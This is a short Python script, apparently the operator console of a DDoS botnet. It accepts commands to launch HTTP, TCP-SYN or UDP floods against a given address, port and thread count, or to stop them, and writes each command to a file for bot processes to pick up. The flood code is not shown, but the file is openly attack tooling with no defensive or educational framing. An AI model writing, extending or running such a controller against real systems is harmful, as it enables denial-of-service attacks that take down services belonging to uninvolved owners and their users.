
TARGET_FILE = "target.txt"

def send_command(command):
    target_file = open(TARGET_FILE, "w")
    target_file.write(command)
    target_file.close()

def show_help():
    print("Usage -")
    print("The following commands are supported -")
    print("To run an attack-")
    print("\tSEND HTTP <target-address> <target-port> <number-of-threads>")
    print("\tSEND TCP-SYN <target-address> <target-port> <number-of-threads>")
    print("\tSEND UDP <target-address> <target-port> <number-of-threads>")
    print("To stop the attack-")
    print("\tSTOP")



def handle_command(args):
    args[0] = args[0].upper()
    if args[0] == "HELP" or args[0] == "H":
        show_help()
    elif args[0] == "STOP":
        send_command("NONE")
    elif args[0] == "SEND":
        args[1] = args[1].upper()
        if args[1] == "HTTP":
            send_command(" ".join(args))
        elif args[1] == "TCP-SYN":
            send_command(" ".join(args))
        elif args[1] == "UDP":
            send_command(" ".join(args))
        else:
            print("Invalid SEND type", args[1])
            send_command("NONE")
    else:
        print("Invalid command", args[0])


print("BOT MASTER CLI")
print("Press Ctrl-D to exit")
print("Use h or help for help")

while True:
    command = ""
    try:
        command = input(">>> ")
    except EOFError:
        print()
        break
    except Exception as e:
        print("Error in command input")

    args = command.split()

    handle_command(args)

print("Bye")
